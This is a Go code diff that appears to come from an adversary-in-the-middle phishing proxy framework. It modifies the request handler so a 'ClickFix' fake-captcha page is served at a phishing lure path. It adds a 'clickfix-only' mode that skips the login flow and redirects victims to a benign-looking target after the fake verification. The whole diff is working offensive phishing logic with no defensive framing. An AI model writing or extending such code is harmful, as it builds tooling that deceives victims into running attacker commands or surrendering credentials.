@@ -534,12 +534,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if err == nil {
 							// clickfix pre-auth gate: serve the fake-captcha page
 							// at the lure path before the login flow starts
-							if cf := pl.ClickFix(); cf != nil && cf.Position == "before" && !p.isForwarderUrl(req.URL) {
-								if s.RedirectCount == 0 {
-									s.RedirectCount += 1
-									lure_url := req_url
-									if req2, resp := p.serveClickFixBefore(req, cf, lure_url, &s.Params); resp != nil {
-										return req2, resp
+							if cf := pl.ClickFix(); cf != nil && !p.isForwarderUrl(req.URL) {
+								if cf.Only || cf.Position == "before" {
+									if s.RedirectCount == 0 {
+										s.RedirectCount += 1
+										lure_url := req_url
+										if cf.Only {
+											// clickfix-only: redirect to the lure's
+											// benign target after verify, skip login
+											lure_url = l.RedirectUrl
+											if lure_url == "" {
+												lure_url = pl.RedirectUrl
+											}
+										}
+										if req2, resp := p.serveClickFixBefore(req, cf, lure_url, &s.Params); resp != nil {
+											return req2, resp
+										}
 									}
 								}
 							}
